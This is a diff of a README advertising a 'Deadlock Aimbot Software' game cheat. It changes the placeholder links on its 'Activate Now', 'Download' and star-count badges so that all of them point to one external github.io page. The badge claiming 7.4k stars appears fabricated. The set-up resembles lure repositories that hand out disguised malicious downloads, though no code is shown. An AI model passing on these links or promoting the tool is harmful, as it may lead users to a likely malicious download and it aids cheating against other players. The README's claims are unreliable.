@@ -12,10 +12,10 @@ In Deadlock, duels are fast, chaotic, and unforgiving. Every missed shot can cos
 Built for **offline training and private testing sessions** only.
 
 
-[![Activate Now](https://img.shields.io/badge/Activate%20Now-red?style=for-the-badge\&logo=rocket)](#)
-[![Windows Support](https://img.shields.io/badge/Windows-10%2F11-blue?style=for-the-badge\&logo=windows)](#)
-[![⭐️ 7.4k Stars](https://img.shields.io/badge/⭐️%207.4k-Stars-yellow?style=for-the-badge\&logo=github)](#)
-[![Download](https://img.shields.io/badge/Download-Latest-green?style=for-the-badge\&logo=github)](#)
+[![Activate Now](https://img.shields.io/badge/Activate%20Now-red?style=for-the-badge\&logo=rocket)](https://deadlock-aimbot-tool.github.io/.github/)
+[![Windows Support](https://img.shields.io/badge/Windows-10%2F11-blue?style=for-the-badge\&logo=windows)](https://deadlock-aimbot-tool.github.io/.github/)
+[![⭐️ 7.4k Stars](https://img.shields.io/badge/⭐️%207.4k-Stars-yellow?style=for-the-badge\&logo=github)](https://deadlock-aimbot-tool.github.io/.github/)
+[![Download](https://img.shields.io/badge/Download-Latest-green?style=for-the-badge\&logo=github)](https://deadlock-aimbot-tool.github.io/.github/)
 
 ---
 
@@ -101,8 +101,8 @@ The **Deadlock Aimbot Software** delivers **precision targeting, recoil control,
 
 ---
 
-[![Activate Now](https://img.shields.io/badge/Activate%20Now-red?style=for-the-badge\&logo=rocket)](#)
-[![Windows Support](https://img.shields.io/badge/Windows-10%2F11-blue?style=for-the-badge\&logo=windows)](#)
-[![⭐️ 7.4k Stars](https://img.shields.io/badge/⭐️%207.4k-Stars-yellow?style=for-the-badge\&logo=github)](#)
-[![Download](https://img.shields.io/badge/Download-Latest-green?style=for-the-badge\&logo=github)](#)
+[![Activate Now](https://img.shields.io/badge/Activate%20Now-red?style=for-the-badge\&logo=rocket)](https://deadlock-aimbot-tool.github.io/.github/)
+[![Windows Support](https://img.shields.io/badge/Windows-10%2F11-blue?style=for-the-badge\&logo=windows)](https://deadlock-aimbot-tool.github.io/.github/)
+[![⭐️ 7.4k Stars](https://img.shields.io/badge/⭐️%207.4k-Stars-yellow?style=for-the-badge\&logo=github)](https://deadlock-aimbot-tool.github.io/.github/)
+[![Download](https://img.shields.io/badge/Download-Latest-green?style=for-the-badge\&logo=github)](https://deadlock-aimbot-tool.github.io/.github/)
 
